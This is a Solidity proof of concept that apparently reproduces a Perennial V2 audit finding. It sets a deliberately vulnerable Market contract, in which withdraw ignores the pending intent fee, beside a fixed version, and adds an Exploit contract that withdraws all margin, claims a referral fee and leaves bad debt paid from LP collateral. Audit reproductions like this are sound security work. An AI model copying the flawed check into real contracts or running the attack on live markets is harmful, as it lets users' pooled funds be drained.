// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Perennial V2 — intent fees (Sherlock 2025-01, issue 31)
    Intent orders are stored with invalidation == 0, so the over-close gate
    does not apply, and the margin check reads collateral without the pending
    trade fee. The taker withdraws every unit deposited. When the checkpoint
    later applies the fee, that account is bad debt and the referrer is paid
    from other collateral in the market.
*/

contract Collateral {
    string public symbol = "DSU";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Market {
    Collateral public immutable token;
    mapping(address => int256) public collateralOf;
    mapping(address => uint256) public pendingFee;
    mapping(address => uint256) public claimable;
    mapping(address => address) public referrerOf;
    mapping(address => uint256) public invalidation;

    constructor(Collateral _token) {
        token = _token;
    }

    function deposit(address user, uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "pull");
        collateralOf[user] += int256(amount);
    }

    function openAndCloseIntent(address user, address referrer, uint256 notional) external {
        invalidation[user] = 0;
        referrerOf[user] = referrer;
        pendingFee[user] = notional * 1000 / 10000;
    }

    function withdraw(address user, uint256 amount) external {
        // InvariantLib: the over-close revert applies only when invalidation != 0.
        if (invalidation[user] != 0 && amount > 0) revert("MarketOverCloseError");
        int256 collateral = collateralOf[user];
        // @> VULN: pendingFee is not subtracted from collateral, so a guaranteed intent can withdraw the entire deposit
        require(collateral >= int256(amount), "MarketInsufficientMarginError");
        collateralOf[user] = collateral - int256(amount);
        require(token.transfer(user, amount), "pay");
    }

    function commit(address user) external {
        uint256 fee = pendingFee[user];
        pendingFee[user] = 0;
        collateralOf[user] -= int256(fee);
        uint256 referral = fee * 20 / 100;
        claimable[referrerOf[user]] += referral;
    }

    function claimFee(address referrer) external returns (uint256 paid) {
        paid = claimable[referrer];
        claimable[referrer] = 0;
        require(token.transfer(referrer, paid), "referral");
    }
}

contract MarketFixed {
    Collateral public immutable token;
    mapping(address => int256) public collateralOf;
    mapping(address => uint256) public pendingFee;
    mapping(address => address) public referrerOf;

    constructor(Collateral _token) {
        token = _token;
    }

    function deposit(address user, uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "pull");
        collateralOf[user] += int256(amount);
    }

    function openAndCloseIntent(address user, address referrer, uint256 notional) external {
        referrerOf[user] = referrer;
        pendingFee[user] = notional * 1000 / 10000;
    }

    function withdraw(address user, uint256 amount) external {
        int256 collateral = collateralOf[user] - int256(pendingFee[user]);
        require(collateral >= int256(amount), "MarketInsufficientMarginError");
        collateralOf[user] -= int256(amount);
        require(token.transfer(user, amount), "pay");
    }
}

contract Exploit {
    uint256 public constant LP = 1000 ether;
    uint256 public constant MARGIN = 100 ether;
    uint256 public constant NOTIONAL = 5000 ether;
    Collateral public token;
    Market public market;
    uint256 public claimed;
    int256 public debt;

    constructor() {
        token = new Collateral();
        market = new Market(token);
        token.mint(address(this), LP + MARGIN);
        token.approve(address(market), LP + MARGIN);
        market.deposit(address(0xB0B), LP);
    }

    function run() external {
        market.deposit(address(this), MARGIN);
        market.openAndCloseIntent(address(this), address(this), NOTIONAL);
        market.withdraw(address(this), MARGIN);
        market.commit(address(this));
        claimed = market.claimFee(address(this));
        debt = market.collateralOf(address(this));
        require(claimed == 100 ether, "referral stolen");
        require(debt == -500 ether, "bad debt");
        require(token.balanceOf(address(this)) == MARGIN + claimed, "profit");
        require(token.balanceOf(address(market)) == LP - claimed, "lp paid it");
    }
}
